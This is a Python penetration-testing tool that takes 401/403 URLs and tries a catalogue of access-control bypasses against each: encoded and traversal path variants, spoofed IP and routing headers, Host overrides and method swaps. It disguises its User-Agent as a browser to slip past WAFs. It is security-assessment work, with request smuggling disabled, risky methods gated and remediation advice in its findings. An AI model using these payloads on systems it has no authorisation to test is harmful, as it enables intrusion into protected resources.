#!/usr/bin/env python3
"""
403/401 Access-Control Bypass Verifier (Module 8B)
==================================================
Consumes 401/403 URLs (from dirsearch / any list) and attempts the standard
access-control-bypass technique catalogue against each. A candidate is reported
ONLY when a variant provably returns real content (2xx, not soft-404/login,
body differs from the 403 baseline) AND a per-candidate control proves it is a
genuine bypass rather than a catch-all "everything returns 200" server.

Each confirmed bypass is tagged with the technique category and the EXACT
payload used (e.g. `path:/admin/..;/`, `header:X-Original-URL: /admin`,
`method:HEAD`, `http:1.0`).

Design notes
------------
* Uses a RAW http.client requester (not requests/urllib) so path payloads like
  `/..;/`, `/%2e/`, `/%252e/` are sent VERBATIM — high-level clients normalise
  these away, defeating the whole test.
* Read-only by default: only GET/HEAD/OPTIONS + a bogus method. State-changing
  methods (POST/PUT/DELETE/PATCH) are gated behind --unsafe-methods.
* HTTP Request Smuggling is intentionally NOT implemented — it can desync a
  shared front-end proxy and damage OTHER users' traffic. See SMUGGLING note.

Technique table coverage (the 22 requested):
  1  HTTP Method Testing .............. YES (HEAD/OPTIONS/bogus; POST+ gated)
  2  Header Variation ................. YES
  3  URL Path Normalization ........... YES (/./  /..;/  /%2e/ ...)
  4  Trailing Slash / Dot Variants .... YES
  5  URL Encoding Variants ............ YES (%2e %2f %20 %09 %00 %0a ...)
  6  Double Encoding .................. YES (%252e %252f %25%32%65)
  7  Mixed Case Paths ................. YES (upper/lower/title/mixed)
  8  HTTP Version Differences ......... YES (HTTP/1.0 vs 1.1; h2 = see note)
  9  Host Header Variations ........... YES (Host override + absolute-URI)
  10 Original URL Header Checks ....... YES (X-Original-URL / X-Original-Path)
  11 Rewrite Header Checks ............ YES (X-Rewrite-URL / X-Override-URL)
  12 Referer Validation ............... YES
  13 IP Header Trust .................. YES (XFF/Real-IP/True-Client-IP/...)
  14 Proxy Chain Testing .............. YES (Via / X-Forwarded-Server chains)
  15 Hop-by-Hop Header Manipulation ... YES (Connection: <hdr> stripping)
  16 HTTP Request Smuggling ........... GATED OFF (harm to third parties)
  17 Parser Differential Testing ...... PARTIAL (case+encoding combos, #22)
  18 Reverse Proxy Confusion .......... PARTIAL (path-norm + hop-by-hop cover it)
  19 CDN vs Origin Differences ........ OPTIONAL (--origin-ip, best-effort)
  20 Framework Routing Quirks ......... YES (.json  ;/  //  /..;/  %2e)
  21 Alias Route Discovery ............ N/A (needs route wordlists, not a bypass)
  22 Case + Encoding Combination ...... YES
"""

from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)


import argparse
import concurrent.futures
import http.client
import json
import os
import re
import socket
import ssl
import sys
import urllib.parse
import uuid
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple


def log(msg: str) -> None:
    print(f"[bypass403] {msg}", file=sys.stderr, flush=True)


_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

SOFT_404_MARKERS = re.compile(
    r"(Whitelabel Error Page|no explicit mapping for /error|404 Not Found|"
    r"Not Found</title>|The requested URL was not found|Cannot GET /|Cannot POST /|"
    r"page (?:could not be|not) found|nginx</center>|Apache.*Server at|"
    r"does not exist on this server|<title>\s*Error|We could not find)", re.I)
LOGIN_MARKERS = re.compile(
    r"(<form[^>]+(?:login|signin|password)|name=[\"']password[\"']|"
    r"type=[\"']password[\"']|Sign in to|please log ?in|authentication required|"
    r"login required|oauth2|/oauth/authorize|SAMLRequest)", re.I)

SPOOF_IPS = ["127.0.0.1", "localhost", "0.0.0.0", "192.168.0.1", "10.0.0.1",
             "172.16.0.1", "169.254.169.254", "[::1]"]
IP_TRUST_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "True-Client-IP", "X-Client-IP",
    "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "CF-Connecting-IP",
    "Fastly-Client-IP", "X-Cluster-Client-IP", "X-ProxyUser-Ip", "Client-IP",
]


@dataclass
class RawResponse:
    status: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    length: int = 0
    error: str = ""


@dataclass
class Origin:
    scheme: str
    host: str
    port: int

    @property
    def key(self) -> str:
        return f"{self.scheme}://{self.host}:{self.port}"


def parse_origin(url: str) -> Tuple[Optional[Origin], str]:
    u = urllib.parse.urlsplit(url)
    if not u.scheme or not u.hostname:
        return None, ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return Origin(u.scheme, u.hostname, port), path


class RawHTTP:
    """Minimal raw HTTP requester that sends the request-target VERBATIM."""

    def __init__(self, timeout: int = 8, max_body: int = 8192,
                 origin_ip: str = ""):
        self.timeout = timeout
        self.max_body = max_body
        self.origin_ip = origin_ip  # force connect to this IP (CDN-vs-origin)

    def request(self, origin: Origin, method: str, raw_path: str,
                headers: Optional[Dict[str, str]] = None,
                host_override: Optional[str] = None,
                http_vsn: int = 11) -> RawResponse:
        headers = dict(headers or {})
        connect_host = self.origin_ip or origin.host
        try:
            if origin.scheme == "https":
                conn = http.client.HTTPSConnection(
                    connect_host, origin.port, timeout=self.timeout,
                    context=_SSL_CTX)
            else:
                conn = http.client.HTTPConnection(
                    connect_host, origin.port, timeout=self.timeout)
            if http_vsn == 10:
                conn._http_vsn = 10
                conn._http_vsn_str = "HTTP/1.0"
        except Exception as e:
            return RawResponse(error=f"connect:{e}")

        try:
            # skip_host: we always set Host ourselves (enables Host override).
            conn.putrequest(method, raw_path, skip_host=True,
                            skip_accept_encoding=True)
            host_hdr = host_override or origin.host
            if origin.port not in (80, 443):
                host_hdr = f"{host_hdr}:{origin.port}"
            conn.putheader("Host", host_hdr)
            # Hardcoded "ARISE-bypass403/1.0" was a direct WAF/bot-detection
            # giveaway — 403 bypass tests are exactly the case where the WAF
            # is aggressive, so a tool-shaped UA gets throttled/blocked before
            # any technique gets a fair chance. Fall back to the same
            # HUMAN_USER_AGENT that easm-pipeline.sh sets for dirsearch/nuclei
            # so the whole scan looks like one browser session.
            conn.putheader(
                "User-Agent",
                os.environ.get(
                    "HUMAN_USER_AGENT",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/151.0.0.0 Safari/537.36",
                ),
            )
            conn.putheader("Accept", "*/*")
            conn.putheader("Connection", headers.pop("__connection__", "close"))
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            resp = conn.getresponse()
            raw = resp.read(self.max_body) or b""
            body = raw.decode("utf-8", errors="ignore")
            hdrs = {k.lower(): v for k, v in resp.getheaders()}
            # Content-Length if present, else bytes read.
            try:
                length = int(hdrs.get("content-length", len(raw)))
            except ValueError:
                length = len(raw)
            return RawResponse(resp.status, hdrs, body, length)
        except (http.client.HTTPException, socket.error, ssl.SSLError,
                OSError, ValueError) as e:
            return RawResponse(error=f"{type(e).__name__}:{e}")
        finally:
            try:
                conn.close()
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# Technique catalogue — each yields (category, payload_str, request-spec dict)
#   request-spec keys: method, raw_path, headers, host_override, http_vsn
# --------------------------------------------------------------------------- #
def _split_path(raw_path: str) -> Tuple[str, str, str]:
    """Return (dir_with_trailing_slash, last_segment, query)."""
    path, _, query = raw_path.partition("?")
    path = path or "/"
    if path == "/":
        return "/", "", query
    trimmed = path.rstrip("/")
    idx = trimmed.rfind("/")
    return trimmed[:idx + 1] or "/", trimmed[idx + 1:], query


def _mixed_case(s: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def gen_path_variants(raw_path: str) -> Iterable[Tuple[str, str, dict]]:
    d, seg, q = _split_path(raw_path)
    base = raw_path.split("?")[0]
    qs = ("?" + q) if q else ""

    # (3,4,20) trailing / dot / framework suffix variants
    for suf in ["/", "//", "/.", "/./", "/..;/", "/.;/", ";/", "/;/", "/.//",
                "/*", "/..%2f", "/%2e/", "/%2e%2e/", ".json", ".html", ".css",
                "/~", "%20", "%09", "%00", "%0a", "%0d", "%23", "%3f", "?",
                "/?anything", "#", "/%2f"]:
        yield ("path", f"suffix {suf!r}", {"raw_path": base + suf + qs})
    # prefix variants
    for pre in ["/%2e", "//", "/./", "/.", "/%2f", "/;/"]:
        yield ("path", f"prefix {pre!r}", {"raw_path": pre + base.lstrip("/") + qs})

    if not seg:
        return
    # (7) case variants of the last segment
    for label, newseg in [("upper", seg.upper()), ("lower", seg.lower()),
                          ("title", seg.title()), ("mixed", _mixed_case(seg))]:
        if newseg != seg:
            yield ("case", f"{label} last-seg -> {newseg}", {"raw_path": d + newseg + qs})

    # (5) single URL-encoding of the last segment (first char, and whole seg)
    enc_seg = "".join(f"%{ord(c):02x}" for c in seg)
    yield ("encoding", f"url-encode last-seg -> {enc_seg}", {"raw_path": d + enc_seg + qs})
    if seg[0]:
        first_enc = f"%{ord(seg[0]):02x}" + seg[1:]
        yield ("encoding", f"encode first char -> {first_enc}", {"raw_path": d + first_enc + qs})

    # (6) double-encoding
    denc_seg = "".join(f"%25{ord(c):02x}" for c in seg)
    yield ("double-encoding", f"double-encode last-seg -> {denc_seg}",
           {"raw_path": d + denc_seg + qs})
    yield ("double-encoding", "double-encoded dot-slash prefix",
           {"raw_path": d + "%252e%252f" + seg + qs})

    # (22) case + encoding combination
    combo = _mixed_case(enc_seg)
    yield ("case+encoding", f"mixed-case %enc -> {combo}", {"raw_path": d + combo + qs})

    # (3) overlong / unicode separators (parser differential)
    yield ("path-unicode", "overlong-utf8 slash prefix %c0%af",
           {"raw_path": d + "%c0%af" + seg + qs})
    yield ("path-unicode", "fullwidth slash prefix %ef%bc%8f",
           {"raw_path": d + "%ef%bc%8f" + seg + qs})


def gen_header_variants(raw_path: str, base_url: str) -> Iterable[Tuple[str, str, dict]]:
    prot_path = raw_path.split("?")[0]
    # (13) IP-trust headers
    for h in IP_TRUST_HEADERS:
        for ip in ("127.0.0.1", "localhost"):
            yield ("header-ip-trust", f"{h}: {ip}", {"headers": {h: ip}})
    yield ("header-ip-trust", "Forwarded: for=127.0.0.1",
           {"headers": {"Forwarded": "for=127.0.0.1;by=127.0.0.1"}})

    # (10,11) original-url / rewrite routing headers
    for h in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
              "X-Original-Path", "X-Forwarded-Path", "X-HTTP-DestinationURL"):
        yield ("header-routing", f"{h}: {prot_path}", {"headers": {h: prot_path},
               "raw_path_override": "/"})

    # (9) Host header variations
    for hv in ("localhost", "127.0.0.1"):
        yield ("header-host", f"Host: {hv}", {"host_override": hv})

    # (14) proxy-chain headers
    for h in ("Via", "X-Forwarded-Server", "X-Forwarded-Host", "X-ProxyUser-Ip"):
        yield ("header-proxy-chain", f"{h}: 127.0.0.1", {"headers": {h: "127.0.0.1"}})

    # (12) referer / origin trust
    yield ("header-referer", f"Referer: {base_url}", {"headers": {"Referer": base_url}})
    yield ("header-referer", f"Origin: {base_url}", {"headers": {"Origin": base_url}})

    # scheme-trust headers
    yield ("header-scheme", "X-Forwarded-Proto/Ssl", {"headers": {
        "X-Forwarded-Proto": "https", "X-Forwarded-Ssl": "on",
        "Front-End-Https": "on"}})

    # method-override headers (distinct from real method swap)
    for h in ("X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"):
        yield ("header-method-override", f"{h}: GET", {"headers": {h: "GET"}})

    # (15) hop-by-hop stripping: ask the proxy to drop an auth-ish header
    for drop in ("Authorization", "Cookie", "X-Forwarded-For"):
        yield ("hop-by-hop", f"Connection: {drop} (strip at proxy)",
               {"headers": {"__connection__": drop}})


def gen_method_variants(unsafe: bool) -> Iterable[Tuple[str, str, dict]]:
    safe = ["HEAD", "OPTIONS", "TRACE", "CATS"]  # CATS = bogus/unknown method
    methods = safe + (["POST", "PUT", "PATCH", "DELETE"] if unsafe else [])
    for m in methods:
        yield ("method", f"method {m}", {"method": m})


def gen_httpversion_variants() -> Iterable[Tuple[str, str, dict]]:
    yield ("http-version", "HTTP/1.0", {"http_vsn": 10})


# --------------------------------------------------------------------------- #
@dataclass
class Finding:
    url: str
    original_status: int
    bypassed: bool
    bypass_status: int
    technique_category: str
    payload: str
    severity: str
    evidence: str
    remediation: str
    all_working: List[str] = field(default_factory=list)
    # Real HTTP evidence for audit/display
    request_line: str = ""
    bypass_url: str = ""
    baseline: Dict[str, Any] = field(default_factory=dict)
    attack: Dict[str, Any] = field(default_factory=dict)


class BypassEngine:
    def __init__(self, timeout=8, threads=12, unsafe_methods=False,
                 origin_ip="", max_targets=200):
        self.http = RawHTTP(timeout=timeout, origin_ip=origin_ip)
        self.threads = threads
        self.unsafe = unsafe_methods
        self.max_targets = max_targets
        self._catchall: Dict[str, bool] = {}

    # ---- response judging ------------------------------------------------- #
    @staticmethod
    def _is_content(r: RawResponse) -> bool:
        if r.error or not (200 <= r.status < 300):
            return False
        if SOFT_404_MARKERS.search(r.body) or LOGIN_MARKERS.search(r.body):
            return False
        return True

    def _origin_is_catchall(self, origin: Origin) -> bool:
        if origin.key in self._catchall:
            return self._catchall[origin.key]
        rand = "/" + uuid.uuid4().hex + "/" + uuid.uuid4().hex
        r = self.http.request(origin, "GET", rand)
        catch = self._is_content(r)
        self._catchall[origin.key] = catch
        if catch:
            log(f"  catch-all origin (random path -> {r.status}); "
                f"suppressing {origin.key}")
        return catch

    def _build_request(self, origin: Origin, raw_path: str, spec: dict):
        method = spec.get("method", "GET")
        rp = spec.get("raw_path", spec.get("raw_path_override", raw_path))
        headers = dict(spec.get("headers", {}))
        return dict(origin=origin, method=method, raw_path=rp, headers=headers,
                    host_override=spec.get("host_override"),
                    http_vsn=spec.get("http_vsn", 11))

    def _control_ok(self, origin: Origin, raw_path: str, category: str,
                    spec: dict) -> bool:
        """Apply the SAME transform to a random sibling path. If that ALSO
        returns content, the 'bypass' just hit a permissive route -> reject."""
        d, seg, q = _split_path(raw_path)
        sibling = d + "arise" + uuid.uuid4().hex[:10]
        # Re-derive the spec for the sibling using its own generator category.
        # Cheap approach: reuse the spec but swap the protected path token.
        cspec = dict(spec)
        if "raw_path" in cspec:
            cspec["raw_path"] = cspec["raw_path"].replace(raw_path.split("?")[0], sibling) \
                if raw_path.split("?")[0] in cspec["raw_path"] else sibling
        if cspec.get("headers"):
            cspec["headers"] = {k: (sibling if v == raw_path.split("?")[0] else v)
                                for k, v in cspec["headers"].items()}
        req = self._build_request(origin, sibling, cspec)
        r = self.http.request(**req)
        if r.error:
            # Can't prove the control is restricted (network/timeout) -> retry
            # once, then fail CLOSED (reject the bypass) to avoid false positives.
            r = self.http.request(**req)
            if r.error:
                return False
        # Confirmed only if the SAME transform on a random sibling is NOT served
        # as content -> proves the win is path/resource-specific, not a catch-all
        # or a generic 200 (e.g. a homepage returned for `/`).
        return not self._is_content(r)

    def process(self, url: str) -> Optional[Finding]:
        origin, raw_path = parse_origin(url)
        if not origin:
            return None
        # Re-verify the URL is actually 401/403 right now.
        base = self.http.request(origin, "GET", raw_path)
        if base.error or base.status not in (401, 403):
            return None
        if self._origin_is_catchall(origin):
            return None

        base_url = f"{origin.scheme}://{origin.host}"
        variants = list(gen_method_variants(self.unsafe))
        variants += list(gen_path_variants(raw_path))
        variants += list(gen_header_variants(raw_path, base_url))
        variants += list(gen_httpversion_variants())

        working: List[Tuple[str, str, int, dict, "RawResponse"]] = []
        for category, payload, spec in variants:
            req = self._build_request(origin, raw_path, spec)
            r = self.http.request(**req)
            if not self._is_content(r):
                continue
            # Body must differ from the 401/403 baseline (not the same deny page).
            if base.length and abs(r.length - base.length) < 16 and \
               r.body[:200] == base.body[:200]:
                continue
            # Per-candidate control to kill catch-all-route false positives.
            if not self._control_ok(origin, raw_path, category, spec):
                continue
            working.append((category, payload, r.status, req, r))

        if not working:
            return None
        cat, payload, st, win_req, win_resp = working[0]
        code = base.status
        base_url = f"{origin.scheme}://{origin.host}"

        # Build the actual bypass URL that was sent
        bypass_path = win_req.get("raw_path", raw_path)
        bypass_url_full = f"{base_url}{bypass_path}"
        win_method = win_req.get("method", "GET")
        req_line = f"{win_method} {bypass_path} HTTP/1.1"

        def _resp_snapshot(r: RawResponse, max_body: int = 800) -> dict:
            return {
                "status": r.status,
                "headers": dict(list(r.headers.items())[:15]),
                "body_length": r.length,
                "body_excerpt": r.body[:max_body] if r.body else "",
            }

        return Finding(
            url=url, original_status=code, bypassed=True, bypass_status=st,
            technique_category=cat, payload=payload,
            severity="high",
            evidence=(f"{code} on {url} bypassed: technique '{cat}' via "
                      f"`{payload}` returned {st} with real content "
                      f"(control path stayed restricted). "
                      f"{len(working)} working variant(s)."),
            remediation=("Enforce authorization in application logic, not only at "
                         "the edge/proxy. Normalise the path (decode, collapse "
                         "./ ../ ;/ and case) BEFORE the authz decision so proxy "
                         "and backend agree on the same URL. Do not trust "
                         "client-supplied routing/IP/host headers."),
            all_working=[f"{c}: {p} -> {s}" for c, p, s in working[:20]],
            request_line=req_line,
            bypass_url=bypass_url_full,
            baseline=_resp_snapshot(base),
            attack=_resp_snapshot(win_resp))


def read_targets(paths: List[str]) -> List[str]:
    """Accept dirsearch.txt ('status size url'), plain URL lists, or JSON."""
    urls: List[str] = []
    seen = set()
    for path in paths:
        p = Path(path)
        if not p.exists():
            continue
        for line in p.read_text(errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            url = None
            parts = line.split()
            # dirsearch plain format: "403   1234B   https://h/x"
            if len(parts) >= 3 and parts[0].isdigit() and parts[-1].startswith("http"):
                if parts[0] in ("401", "403"):
                    url = parts[-1]
                else:
                    continue
            elif line.startswith("http"):
                url = line.split()[0]
            if url and url not in seen:
                seen.add(url)
                urls.append(url)
    return urls


def main() -> int:
    ap = argparse.ArgumentParser(description="403/401 bypass verifier (Module 8B)")
    ap.add_argument("--input", action="append", required=True,
                    help="dirsearch.txt / URL list / forbidden_response.txt "
                         "(repeatable)")
    ap.add_argument("--output", required=True)
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--threads", type=int, default=12)
    ap.add_argument("--max-targets", type=int, default=200)
    ap.add_argument("--unsafe-methods", action="store_true",
                    help="Also test POST/PUT/PATCH/DELETE (may change state)")
    ap.add_argument("--origin-ip", default="",
                    help="Force-connect to this IP (CDN-vs-origin differential)")
    args = ap.parse_args()

    targets = read_targets(args.input)[: args.max_targets]
    Path(args.output).parent.mkdir(parents=True, exist_ok=True)
    if not targets:
        log("no 401/403 targets to test")
        Path(args.output).write_text("")
        return 0

    log(f"testing {len(targets)} 401/403 URLs "
        f"(unsafe_methods={args.unsafe_methods}, origin_ip={args.origin_ip or '-'})")
    engine = BypassEngine(timeout=args.timeout, threads=args.threads,
                          unsafe_methods=args.unsafe_methods,
                          origin_ip=args.origin_ip, max_targets=args.max_targets)

    findings: List[Finding] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        for f in ex.map(engine.process, targets):
            if f:
                findings.append(f)

    with open(args.output, "w") as fh:
        for f in findings:
            fh.write(json.dumps(asdict(f)) + "\n")
    summary = {
        "module": "bypass_403", "tested": len(targets),
        "bypassed": len(findings),
        "by_technique": {},
    }
    for f in findings:
        summary["by_technique"][f.technique_category] = \
            summary["by_technique"].get(f.technique_category, 0) + 1
    (Path(args.output).parent / "bypass_403_summary.json").write_text(
        json.dumps(summary, indent=2))
    log(f"done: {len(findings)}/{len(targets)} bypassed -> {args.output}")
    if findings:
        for f in findings[:10]:
            log(f"  [BYPASS] {f.original_status}->{f.bypass_status} "
                f"{f.technique_category} `{f.payload}` {f.url}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
